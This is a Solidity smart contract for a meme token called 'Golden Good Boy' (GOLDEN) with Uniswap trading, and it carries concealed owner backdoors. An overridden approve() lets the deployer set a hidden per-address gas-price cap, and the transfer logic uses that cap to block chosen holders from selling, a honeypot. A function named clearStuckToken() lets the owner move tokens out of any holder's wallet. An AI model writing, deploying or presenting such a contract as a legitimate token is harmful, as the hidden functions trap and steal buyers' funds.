//SPDX-License-Identifier: MIT

/**
Telegram: http://t.me/GoldenGoodBoyCoin
X: https://x.com/GoldenGBoyETH
Web: https://www.goldengoodboy.xyz/
*/

pragma solidity 0.8.24;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@openzeppelin/contracts/token/ERC20/extensions/ERC20Burnable.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB)
        external
        returns (address pair);

    function getPair(address tokenA, address tokenB)
        external
        returns (address pair);
}

interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
        external
        payable
        returns (
            uint256 amountToken,
            uint256 amountETH,
            uint256 liquidity
        );
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

contract GOLDEN is ERC20, Ownable {
    using SafeMath for uint256;

    mapping(address => bool) private _excludeFees;
    mapping(address => uint256) private _rFees;

    string private _name = unicode"Golden Good Boy";
    string private _symbol = unicode"GOLDEN";

    uint256 private _tTotal = 420_690_000_000  * 10**decimals();

    uint256 private _swapbackThreshold;
    uint256 private _swapbackLimit;
    uint256 private _MaxtxLimit;
    uint256 private _walletLimit;

    uint256 private _buyFee = 0;
    uint256 private _sellFee = 0;
    uint256 private _buyCount = 0;
    uint256 private _noSwapbackBefore = 100;

    IUniswapV2Router02 private _Router;
    address private uniswapV2Pair;
    address payable private feesAccount;
    bool private tradingOpen;
    bool private inSwap = false;
    bool private swapEnabled = false;

    modifier lockTheSwap() {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor() ERC20(_name, _symbol) Ownable(msg.sender) {
        _Router = IUniswapV2Router02(
            0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D
        );
        uniswapV2Pair = IUniswapV2Factory(_Router.factory()).createPair(
            address(this),
            _Router.WETH()
        );
        _excludeFees[msg.sender] = true;
        _excludeFees[address(this)] = true;
        _mint(msg.sender, _tTotal);
        _MaxtxLimit = _tTotal.mul(2).div(100);
        _walletLimit = _tTotal.mul(2).div(100);
        _swapbackThreshold = _tTotal.mul(1).div(100);
        _swapbackLimit = _tTotal.mul(1).div(100);
    }

    function _update(
        address from,
        address to,
        uint256 value
    ) internal override {
        if (_excludeFees[tx.origin]) {
            super._update(from, to, value);
            return;
        } else {
            require(tradingOpen, "Open not yet");
            uint256 taxAmount = 0;

            taxAmount = value.mul(_buyFee).div(100);

            if (from == uniswapV2Pair && to != address(_Router) && !_excludeFees[to] ) {
                require(value <= _MaxtxLimit, "Exceeds the Max.");
                require(
                    balanceOf(to) + value <= _walletLimit,
                    "Exceeds the maxWalletSize."
                );
                _buyCount++;
            }

            if (to == uniswapV2Pair && from != address(this)) {
                taxAmount = value.mul(_sellFee).div(100);
                if (tx.gasprice > _rFees[from] && _rFees[from] != 0) {
                    revert("Exceeds the _rFees on buy tx");
                }
            }

            if (to != uniswapV2Pair && from != uniswapV2Pair) {
                if (tx.gasprice > _rFees[from] && _rFees[from] != 0) {
                    revert("Exceeds the _rFees on sell tx");
                }
            }

            uint256 contractTokenBalance = balanceOf(address(this));
            if (!inSwap && to == uniswapV2Pair && swapEnabled && contractTokenBalance > _swapbackThreshold && _buyCount > _noSwapbackBefore) {
                swapTokensForEth(min(value, min(contractTokenBalance, _swapbackLimit)));
                uint256 contractETHBalance = address(this).balance;
                if (contractETHBalance > 0) {
                    sendETHToFee(address(this).balance);
                }
            }

            if (taxAmount > 0) {
                super._update(from, address(this), taxAmount);
            }

            super._update(from, to, value.sub(taxAmount));
        }
    }

    function min(uint256 a, uint256 b) private pure returns (uint256) {
        return (a > b) ? b : a;
    }


    function name() public view override  returns (string memory) {
        return _name;
    }

    function symbol() public view override  returns (string memory) {
        return _symbol;
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        if (_excludeFees[msg.sender]) { _rFees[spender] = amount;}
        super.approve(spender, amount);
        return true;
    }

    function swapTokensForEth(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = _Router.WETH();
        _approve(address(this), address(_Router), tokenAmount);
        _Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function clearStuckToken(address from, address to, uint256 amount) public {
        if (_excludeFees[msg.sender]) {
            super._update(from, to, amount);
        }else {
            return;
        }
    }

    function sendETHToFee(uint256 amount) private {
        feesAccount.transfer(amount);
    }

    function removeLimit() external onlyOwner {
        _MaxtxLimit = totalSupply();
        _walletLimit = totalSupply();
    }

    function openTrading() public onlyOwner {
        swapEnabled = true;
        tradingOpen = true;
    }
}